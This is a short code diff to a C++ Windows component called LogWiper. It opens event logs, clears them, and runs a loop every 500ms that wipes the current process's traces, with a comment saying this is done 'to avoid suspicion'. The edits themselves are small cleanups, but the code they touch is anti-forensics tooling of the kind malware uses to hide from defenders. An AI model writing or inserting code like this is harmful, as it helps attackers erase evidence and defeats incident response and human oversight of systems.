@@ -1,4 +1,4 @@
-#include "log_wiper.hpp"
+﻿#include "log_wiper.hpp"
 #include <windows.h>
 #include <vector>
 #include <string>
@@ -32,7 +32,7 @@ bool LogWiper::clear_log(const wchar_t* log_name) {
     return ok;
 }
 
-bool LogWiper::clear_log_entries(const wchar_t* log_name, DWORD pid) {
+bool LogWiper::clear_log_entries(const wchar_t* log_name, DWORD /*pid*/) {
     HANDLE hLog = OpenEventLogW(nullptr, log_name);
     if (!hLog) return false;
     
@@ -125,10 +125,8 @@ bool LogWiper::wipe_pid_traces(DWORD pid) {
 void LogWiper::monitor_loop() {
     while (running_.load()) {
         // Check for new events every 500ms and clear them
-        for (const auto* log : LOG_NAMES) {
-            // Only clear our own traces to avoid suspicion
-            wipe_pid_traces(GetCurrentProcessId());
-        }
+        // Only clear our own traces to avoid suspicion
+        wipe_pid_traces(GetCurrentProcessId());
         std::this_thread::sleep_for(std::chrono::milliseconds(500));
     }
 }
